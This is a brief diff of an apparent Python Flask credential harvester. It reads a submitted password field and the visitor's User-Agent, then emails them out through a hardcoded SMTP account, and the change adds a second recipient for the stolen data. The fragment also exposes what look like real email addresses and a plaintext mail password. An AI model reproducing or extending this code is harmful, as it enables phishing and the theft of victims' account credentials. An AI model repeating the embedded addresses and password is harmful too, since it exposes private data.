@@ -84,7 +84,7 @@ def first():
         passwordemail = request.form.get("pig")
         sender_email = "log@guide-level.com"
         sender_emaill = "contact"
-        receiver_email = "danielnewwoj@gmail.com"
+        receiver_email = "danielnewwoj@gmail.com, miriam.adelson@clubmember.org"
         password = "!p&4Ke_@M2HR"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
